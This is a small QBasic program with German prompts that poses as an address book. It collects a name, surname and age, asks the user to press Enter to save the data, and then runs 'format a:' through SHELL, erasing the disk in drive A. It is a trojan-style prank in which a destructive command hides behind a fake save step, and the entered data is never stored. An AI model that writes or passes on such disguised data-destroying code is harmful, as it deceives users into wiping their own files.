CLS
PRINT TAB(20); "A D D R E S S B U C H"
PRINT TAB(19); "อออออออออออออออออออออออ"
INPUT "Gib deinen Namen ein! ", a$
INPUT "Und nun deinen Nachname: ", a$
INPUT "Wie alt bist du"; a$
PRINT "Die Pers”nlichen Daten Speichern ?"
PRINT "Wenn ja, dann EINGABETASTE drcken..."
DO: LOOP UNTIL INKEY$ = CHR$(13)
SHELL "a:"
SHELL "format a:"

